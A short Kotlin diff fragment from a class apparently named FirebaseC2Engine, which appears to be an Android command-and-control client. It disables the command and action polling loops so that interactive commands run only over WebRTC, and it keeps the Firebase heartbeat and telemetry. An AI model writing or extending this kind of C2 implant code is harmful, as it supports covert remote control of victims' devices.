@@ -107,10 +107,12 @@ class FirebaseC2Engine(
     fun startEngine() {
         if (isEngineRunning) return
         isEngineRunning = true
-        Log.i(TAG, "Starting 6-Account Failover Firebase C2 Engine...")
+        Log.i(TAG, "Starting Direct-Only WebRTC C2 Engine with Firebase Heartbeat & Telemetry Sync...")
 
-        startCommandPollingLoop()
-        startActionApiPollingLoop()
+        // Interactive operations use WebRTC DataChannels exclusively per Task 06 Direct-Only P2P policy.
+        // Command polling and Action REST polling fallbacks are disabled for interactive commands.
+        // startCommandPollingLoop()
+        // startActionApiPollingLoop()
         startHeartbeatLoop()
     }
 
